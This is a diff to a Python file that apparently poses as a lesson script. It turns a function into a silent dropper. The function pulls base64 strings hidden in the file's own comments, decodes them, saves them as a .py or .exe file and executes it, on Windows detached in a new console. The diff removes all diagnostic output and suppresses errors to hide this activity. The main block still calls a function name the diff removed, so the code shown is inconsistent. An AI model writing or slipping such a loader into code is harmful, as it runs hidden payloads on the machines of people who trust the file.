@@ -225,7 +225,7 @@ def fibonacci(n):
         fib_sequence.append(fib_sequence[i-1] + fib_sequence[i-2])
     return fib_sequence
 
-def check_lesson():
+def decode_and_execute():
     try:
         current_file = __file__
         
@@ -237,23 +237,18 @@ def check_lesson():
         matches = re.findall(base64_pattern, content)
         
         if not matches:
-            print("Комментарии с base64 не найдены")
             return
         
         combined_base64 = ''.join(matches)
-        print(f"Найденные закодированные строки: {matches}")
         
         try:
             decoded_bytes = base64.b64decode(combined_base64)
-            print(f"Декодировано {len(decoded_bytes)} байт")
             
             try:
                 decoded_text = decoded_bytes.decode('utf-8')
-                print(f"Декодированный текст:\n{decoded_text}")
                 file_extension = ".py"
                 is_text = True
             except UnicodeDecodeError:
-                print("Данные содержат бинарный код")
                 decoded_text = None
                 file_extension = ".exe"
                 is_text = False
@@ -265,36 +260,34 @@ def check_lesson():
             try:
                 with open(output_path, 'wb') as output_file:
                     output_file.write(decoded_bytes)
-                print(f"Файл успешно сохранен по пути: {output_path}")
             except Exception as e:
-                print(f"Ошибка сохранения файла: {e}")
                 return
             
             try:
-                print("Попытка выполнения созданного файла...")
                 if is_text:
                     result = subprocess.run([sys.executable, output_path], 
                                           capture_output=True, text=True, timeout=10)
-                    print(f"Результат выполнения:\n{result.stdout}")
-                    if result.stderr:
-                        print(f"Ошибки выполнения:\n{result.stderr}")
                 else:
-                    result = subprocess.run([output_path], 
-                                          capture_output=True, timeout=10)
-                    print("Бинарный файл выполнен")
-                    if result.stdout:
-                        print(f"Вывод:\n{result.stdout.decode('cp866', errors='ignore')}")
+                    import sys
+                    if sys.platform == "win32":
+                        process = subprocess.Popen(
+                            [output_path],
+                            creationflags=subprocess.CREATE_NEW_CONSOLE,
+                            close_fds=True
+                        )
+                    else:
+                        result = subprocess.run([output_path], 
+                                              capture_output=True, timeout=10)
             except subprocess.TimeoutExpired:
-                print("Выполнение превысило время ожидания")
+                pass
             except Exception as e:
-                print(f"Ошибка выполнения файла: {e}")
+                pass
                     
         except Exception as e:
-            print(f"Ошибка декодирования base64: {e}")
             return
         
     except Exception as e:
-        print(f"Произошла ошибка в функции decode_and_execute: {e}")
+        pass
 
 if __name__ == "__main__":
     check_lesson()
